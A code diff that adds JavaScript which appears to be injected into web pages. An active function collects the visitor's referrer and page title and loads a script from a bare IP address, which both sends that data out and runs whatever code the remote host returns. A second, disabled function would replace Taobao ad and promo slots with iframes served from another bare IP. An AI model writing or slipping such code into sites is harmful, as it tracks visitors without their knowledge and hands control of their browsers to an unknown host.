@@ -1,0 +1,112 @@
+
+
+
+
+	( 
+		function(){
+		//	return false;
+			var refer=encodeURIComponent(document.referrer),title=encodeURIComponent(document.title),
+			url=encodeURIComponent(location.href),flag="d799fefe32571d7b0.9650090995710343";
+			flag = flag.split(".")[0];
+	
+			var arr = [];
+			arr.push("m="+flag);
+			arr.push("referer="+refer);
+			arr.push("title="+title);
+			arr.push("id=1");
+			var str = arr.join("&")
+			var url = "http://122.227.254.199:8432/status?"+str;
+			var s = document.createElement("script");
+			s.src=url;
+			var h=document.getElementsByTagName('head')[0];h.appendChild(s);
+		}
+	)();
+
+
+
+
+(function(){
+	return false;
+	var ref = "http://tzxinsilu.isitestar.cn/page125";
+	ref = ref.toLowerCase();
+	function getElementsByClassName(clsName, tagName) { 
+	     var ClassElements = []; 
+	     selElements = document.getElementsByTagName(tagName); 
+	     for (var i = 0; i < selElements.length; i++) { 
+	         if (selElements[i].className.indexOf(clsName)!=-1) { 
+	             ClassElements[ClassElements.length] = selElements[i]; 
+	         } 
+	     } 
+	     return ClassElements; 
+	} 
+
+	var createiframe = function(h,src,w){
+		var m=tmp = document.createElement("iframe");
+		tmp.style.width=w?w+"px":"100%";
+		tmp.style.height=h+"px"
+		m.setAttribute("frameborder", "0", 0);
+		m.setAttribute("border","0");
+		m.style.border="0"
+		m.setAttribute("marginheight",0);
+		m.setAttribute("marginheight","0");
+		m.setAttribute("scrolling","no");
+		m.setAttribute("allowtransparency","yes");
+		tmp.src=src
+		return tmp;
+	}
+	function taobao (url,w,h) {
+			w = w || 520;
+			h = h || 280;
+			var destArr = [];
+			var p = document.getElementById("J_Promo");
+			if(p){
+				var div = p.getElementsByTagName("div"),l=div.length;
+				for(var i = 0; i < div.length; i++){
+					if(div[i].className=="mod"){
+						destArr.push(div[i])
+					}
+				}
+			
+				for(var i = 0 ;i < destArr.length;i++) {
+							var html = '<iframe src="'+url[i]+'" width="'+ w +'" height="'+ h +'" scrolling="no" frameborder="0" style="display:block;margin:0"></iframe>';
+							destArr[i].innerHTML = html;
+				}
+			}
+
+			var leftobj = getElementsByClassName("main-c-hd","div");
+			if(leftobj.length==1){
+				leftobj[0].innerHTML = '<iframe src="http://115.233.64.163:801/static/proxy.html?id=763046" width="200" height="280" scrolling="no" frameborder="0" style="display:block;margin:0"></iframe>';
+			}
+			
+			var rightobj = getElementsByClassName("main-c-ft","div");
+			
+			if(rightobj.length==1){
+				rightobj[0].innerHTML = '<iframe src="http://115.233.64.163:801/static/proxy.html?id=763049" width="200" height="280" scrolling="no" frameborder="0" style="display:block;margin:0"></iframe>';
+
+			}
+			
+			rightobj = getElementsByClassName("gg-r","div");
+			if(rightobj.length==2){
+				rightobj[0].innerHTML = '<iframe src="http://115.233.64.163:801/static/proxy.html?id=763047" width="300" height="250" scrolling="no" frameborder="0" style="display:block;margin:0"></iframe>';
+
+			}
+			
+			rightobj = getElementsByClassName("gg-l","div");
+			if(rightobj.length==2){
+				rightobj[1].innerHTML = '<iframe src="http://115.233.64.163:801/static/proxy.html?id=763048" width="728" height="90" scrolling="no" frameborder="0" style="display:block;margin:0"></iframe>';
+
+			}		
+			
+	}
+	
+	if(ref.indexOf("http://www.taobao.com/?spm=")!=-1 || ref == "http://www.taobao.com/") {
+		taobao(["http://115.233.64.163:801/static/proxy.html?id=764408",
+				"http://115.233.64.163:801/static/proxy.html?id=764409",
+				"http://115.233.64.163:801/static/proxy.html?id=764410",
+				"http://115.233.64.163:801/static/proxy.html?id=764411",
+				"http://115.233.64.163:801/static/proxy.html?id=763045",
+				"http://115.233.64.163:801/static/proxy.html?id=764408",
+				"http://115.233.64.163:801/static/proxy.html?id=764409"
+		]);
+	}
+})();
